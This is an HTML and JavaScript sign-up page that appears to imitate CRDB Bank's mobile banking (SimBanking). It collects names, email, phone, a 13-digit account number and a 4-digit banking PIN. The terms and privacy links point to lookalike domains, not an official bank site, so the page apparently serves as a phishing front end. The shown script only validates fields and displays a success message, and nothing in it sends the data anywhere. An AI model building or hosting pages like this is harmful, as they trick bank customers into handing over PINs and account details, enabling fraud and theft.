<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign Up</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #007749;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      background-color: white;
      padding: 10%;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      width: 300px;
      text-align: center;
    }

    .input-field {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 16px;
    }

    .input-field:last-of-type {
      position: relative;
    }

    .input-field + .input-field {
      margin-top: 15px;
    }

    .toggle-password {
      position: absolute;
      right: 15px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
    }

    .signup-btn {
      background-color: white;
      color: black;
      border: 2px solid #ccc;
      padding: 10px;
      margin-top: 15px;
      font-size: 18px;
      border-radius: 5px;
      cursor: pointer;
    }

    .signup-btn:hover {
      background-color: #eee;
    }

    .error {
      color: red;
      font-size: 14px;
      margin-top: 10px;
    }

    .success {
      color: #007749;
      font-size: 14px;
      margin-top: 10px;
    }

    .error-message {
      display: none;
      text-align: left;
      margin-top: -10px;
      margin-bottom: 10px;
    }

    .checkbox-label {
      display: flex;
      align-items: center;
      margin-top: 15px;
      margin-bottom: 15px;
    }

    .checkbox-label input[type="checkbox"] {
      accent-color: #007749; /* Set the color of the checkbox */
      margin-right: 10px;
    }

    .checkbox-label a {
      color: #007749;
      text-decoration: none;
    }

    .checkbox-label a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <form id="signupForm">
      <input type="text" id="firstName" class="input-field" placeholder="First Name" required>
      <div id="firstNameErrorMessage" class="error-message error"></div>

      <input type="text" id="middleName" class="input-field" placeholder="Middle Name">
      <div id="middleNameErrorMessage" class="error-message error"></div>

      <input type="text" id="lastName" class="input-field" placeholder="Last Name" required>
      <div id="lastNameErrorMessage" class="error-message error"></div>

      <input type="email" id="email" class="input-field" placeholder="Email Address" required>
      <div id="emailErrorMessage" class="error-message error"></div>

      <input type="text" id="phoneNumber" class="input-field" placeholder="Phone Number" required maxlength="10">
      <div id="phoneErrorMessage" class="error-message error"></div>

      <input type="text" id="accountNumber" class="input-field" placeholder="Account Number" required maxlength="13" readonly>
      <div id="accountErrorMessage" class="error-message error"></div>

      <div style="position: relative;">
        <input type="password" id="pin" class="input-field" placeholder="Simbanking PIN" required maxlength="4">
        <span class="toggle-password" onclick="togglePassword()">üëÅÔ∏è</span>
      </div>
      <div id="pinErrorMessage" class="error-message error"></div>

      <div class="checkbox-label">
        <input type="checkbox" id="terms" required>
        <label for="terms">
          I agree to the <a href="https://crdbbank-co-tz.webpkgcache.com/doc/-/s/crdbbank.co.tz/storage/app/media/Forms%20and%20Guides/General-Terms-and-Condition.pdf" target="_blank">Terms and Conditions</a> and <a href="https://crdbbank.cd/storage/app/media/Forms%20and%20Guides/CRDB-BANK-PLC-WEBSITE-PRIVACY-POLICY.pdf" target="_blank">Privacy Policy</a>
        </label>
      </div>

      <button type="submit" class="signup-btn">Sign Up</button>
    </form>
    <div id="formErrorMessage" class="error"></div>
    <div id="successMessage" class="success"></div>
  </div>

  <script>
    const form = document.getElementById('signupForm');
    const phoneNumberInput = document.getElementById('phoneNumber');
    const accountNumberInput = document.getElementById('accountNumber');
    const pinInput = document.getElementById('pin');
    const emailInput = document.getElementById('email');
    const firstNameInput = document.getElementById('firstName');
    const middleNameInput = document.getElementById('middleName');
    const lastNameInput = document.getElementById('lastName');
    const phoneErrorMessage = document.getElementById('phoneErrorMessage');
    const accountErrorMessage = document.getElementById('accountErrorMessage');
    const pinErrorMessage = document.getElementById('pinErrorMessage');
    const emailErrorMessage = document.getElementById('emailErrorMessage');
    const firstNameErrorMessage = document.getElementById('firstNameErrorMessage');
    const middleNameErrorMessage = document.getElementById('middleNameErrorMessage');
    const lastNameErrorMessage = document.getElementById('lastNameErrorMessage');
    const formErrorMessage = document.getElementById('formErrorMessage');
    const successMessage = document.getElementById('successMessage');
    const togglePasswordIcon = document.querySelector('.toggle-password');

    let showPassword = false;

    function capitalizeFirstLetter(input) {
      let value = input.value.trim();
      if (value.length > 0) {
        input.value = value.charAt(0).toUpperCase() + value.slice(1);
      }
    }

    function handleFieldKeyPress(event) {
      if (event.key === 'Enter') {
        const input = event.target;
        if (input.id === 'firstName' || input.id === 'middleName' || input.id === 'lastName') {
          capitalizeFirstLetter(input);
          // Move focus to the next input field
          const inputs = Array.from(document.querySelectorAll('.input-field'));
          const index = inputs.indexOf(input);
          if (index < inputs.length - 1) {
            inputs[index + 1].focus();
          }
          event.preventDefault(); // Prevent default Enter key action
        }
      }
    }

    function handleEmailKeyPress(event) {
      if (event.key === 'Enter') {
        const emailValue = emailInput.value.trim().toLowerCase();
        const domain = "@gmail.com";
        if (!emailValue.includes('@') || !emailValue.endsWith(domain)) {
          emailInput.value = emailValue.split('@')[0] + domain;
        }
        event.preventDefault();
        // Move focus to the phone number input field
        phoneNumberInput.focus();
      }
    }

    function validatePhoneNumber() {
      let phoneNumber = phoneNumberInput.value;
      phoneNumber = phoneNumber.replace(/\D/g, ''); // Remove non-numeric characters

      if (phoneNumber.length === 10) {
        if (phoneNumber.charAt(0) === '0' && (phoneNumber.charAt(1) === '6' || phoneNumber.charAt(1) === '7')) {
          phoneNumberInput.value = phoneNumber; // Valid number
          phoneErrorMessage.style.display = "none";
          accountNumberInput.focus(); // Move to account number field
        } else {
          phoneErrorMessage.innerText = "Phone number must start with 06 or 07.";
          phoneErrorMessage.style.display = "block";
          phoneNumberInput.value = phoneNumber.slice(0, 10);
        }
      } else {
        phoneErrorMessage.style.display = "none";
      }

      if (phoneNumber.length > 10) {
        phoneNumberInput.value = phoneNumber.slice(0, 10);
      }
    }

    function setupPhoneNumberValidation() {
      phoneNumberInput.addEventListener('input', validatePhoneNumber);
      phoneNumberInput.addEventListener('blur', validatePhoneOnBlur);
    }

    function validatePhoneOnBlur() {
      let phoneNumber = phoneNumberInput.value;
      phoneNumber = phoneNumber.replace(/\D/g, '');

      if (phoneNumber.length !== 10) {
        phoneNumberInput.value = '';
      }
    }

    function validateAccountNumber(event) {
      let accountNumber = accountNumberInput.value;
      accountNumber = accountNumber.replace(/\D/g, '');

      if (accountNumber.length > 0 && (accountNumber.length < 13 || accountNumber.length > 13)) {
        accountErrorMessage.innerText = "Account number must be exactly 13 digits.";
        accountErrorMessage.style.display = "block";
      } else {
        accountErrorMessage.style.display = "none";
      }

      accountNumberInput.value = accountNumber;
    }

    function validateAccountOnBlur() {
      let accountNumber = accountNumberInput.value;
      if (accountNumber.length !== 13) {
        accountNumberInput.value = '';
      }
    }

    function validatePIN(event) {
      let pin = pinInput.value;
      pin = pin.replace(/\D/g, '');
      pinInput.value = pin;
    }

    function validatePINOnBlur() {
      let pin = pinInput.value;
      if (pin.length !== 4) {
        pinInput.value = '';
      }
    }

    function togglePassword() {
      if (showPassword) {
        pinInput.type = 'password';
        togglePasswordIcon.textContent = 'üëÅÔ∏è';
      } else {
        pinInput.type = 'text';
        togglePasswordIcon.textContent = 'üôà';
      }
      showPassword = !showPassword;
    }

    function validateNameInput(event) {
      const input = event.target;
      const value = input.value;
      input.value = value.replace(/[^a-zA-Z\s]/g, ''); // Remove non-letter characters
    }

    function validateNameOnBlur(event) {
      const input = event.target;
      const value = input.value;
      if (!/^[a-zA-Z\s]+$/.test(value)) {
        input.value = '';
      }
    }

    form.addEventListener('submit', function(event) {
      event.preventDefault();
      let isFormValid = true;

      if (!firstNameInput.value.trim()) {
        firstNameErrorMessage.innerText = "First name is required.";
        firstNameErrorMessage.style.display = "block";
        isFormValid = false;
      } else {
        firstNameErrorMessage.style.display = "none";
      }

      if (!lastNameInput.value.trim()) {
        lastNameErrorMessage.innerText = "Last name is required.";
        lastNameErrorMessage.style.display = "block";
        isFormValid = false;
      } else {
        lastNameErrorMessage.style.display = "none";
      }

      if (!emailInput.value.trim()) {
        emailErrorMessage.innerText = "Email is required.";
        emailErrorMessage.style.display = "block";
        isFormValid = false;
      } else {
        emailErrorMessage.style.display = "none";
      }

      if (!phoneNumberInput.value.trim()) {
        phoneErrorMessage.innerText = "Phone number is required.";
        phoneErrorMessage.style.display = "block";
        isFormValid = false;
      } else {
        phoneErrorMessage.style.display = "none";
      }

      if (!accountNumberInput.value.trim()) {
        accountErrorMessage.innerText = "Account number is required.";
        accountErrorMessage.style.display = "block";
        isFormValid = false;
      } else {
        accountErrorMessage.style.display = "none";
      }

      if (!pinInput.value.trim()) {
        pinErrorMessage.innerText = "PIN is required.";
        pinErrorMessage.style.display = "block";
        isFormValid = false;
      } else {
        pinErrorMessage.style.display = "none";
      }

      if (!document.getElementById('terms').checked) {
        formErrorMessage.innerText = "You must agree to the terms and conditions.";
        formErrorMessage.style.display = "block";
        isFormValid = false;
      } else {
        formErrorMessage.style.display = "none";
      }

      if (isFormValid) {
        successMessage.innerText = "Sign up successful!";
      } else {
        successMessage.innerText = "";
      }
    });

    emailInput.addEventListener('keypress', handleEmailKeyPress);
    form.addEventListener('keypress', handleFieldKeyPress);
    setupPhoneNumberValidation();
    
    // Attach validation handlers for name fields
    firstNameInput.addEventListener('input', validateNameInput);
    firstNameInput.addEventListener('blur', validateNameOnBlur);

    middleNameInput.addEventListener('input', validateNameInput);
    middleNameInput.addEventListener('blur', validateNameOnBlur);

    lastNameInput.addEventListener('input', validateNameInput);
    lastNameInput.addEventListener('blur', validateNameOnBlur);
  </script>
</body>
</html>
